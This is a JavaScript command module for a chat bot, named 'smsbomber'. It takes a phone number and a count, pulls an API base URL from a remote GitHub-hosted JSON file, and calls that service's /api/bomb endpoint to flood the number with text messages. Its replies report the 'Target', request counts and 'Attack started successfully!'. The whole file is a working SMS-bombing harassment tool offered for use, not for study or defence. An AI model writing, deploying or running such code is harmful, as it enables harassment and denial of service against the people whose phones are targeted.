const axios = require("axios");

const API_CONFIG_URL = "https://raw.githubusercontent.com/goatbotnx/xalmanx210/refs/heads/main/apis.json";
const API_KEY = "xalman-hub";
let apiBaseUrl = null;
let apiConfigRequest = null;

async function getApiBaseUrl() {
  if (apiBaseUrl) return apiBaseUrl;

  if (!apiConfigRequest) {
    apiConfigRequest = axios
      .get(API_CONFIG_URL, { timeout: 15000 })
      .then(({ data }) => {
        const baseUrl = data?.[API_KEY];

        if (typeof baseUrl !== "string" || !baseUrl.trim()) {
          throw new Error(`Missing API key in apis.json: ${API_KEY}`);
        }

        apiBaseUrl = baseUrl.replace(/\/+$/, "");
        return apiBaseUrl;
      })
      .finally(() => {
        apiConfigRequest = null;
      });
  }

  return apiConfigRequest;
}

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smb", "bomb"],
    version: "3.0",
    author: "xalman",
    role: 0,
    countDown: 5,
    category: "tools",
    guide: {
      en: "{pn} <phone> [count]"
    }
  },

  onStart: async function ({ api, event, args, message }) {
    const { threadID, messageID } = event;
    const API_URL = `${await getApiBaseUrl()}/api/bomb`;

    const phone = args[0];
    const count = args[1] || 1;

    if (!phone || isNaN(phone) || phone.length < 11) {
      return message.reply("⚠️ Invalid Phone Number!\nExample: /smsbomb 018xxxxxxxx 1");
    }

    api.setMessageReaction("🚀", messageID, () => {}, true);

    try {
      const res = await axios.get(`${API_URL}?phone=${phone}&count=${count}`);

      if (res.data && res.data.status === true) {
        api.setMessageReaction("✅", messageID, () => {}, true);

        const data = res.data;
        const msg = `🚀 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 𝗕𝗗
━━━━━━━━━━━━━━━━━━━━━━
📱 Target: ${data.target || phone}
⚡ Mode: ${data.mode || "HIGH"}
📊 Total Requests: ${data.total_requests || 0}
🌀 Total APIs: ${data.total_apis || 0}
🔄 Rounds: ${data.total_rounds || 1}
💬 Status: ${data.message || "Attack started successfully!"}
━━━━━━━━━━━━━━━━━━━━━━`;

        return message.reply(msg);
      } else {
        throw new Error();
      }

    } catch (error) {
      api.setMessageReaction("❌", messageID, () => {}, true);
      return message.reply("❌ Bombing failed or API error!");
    }
  }
};
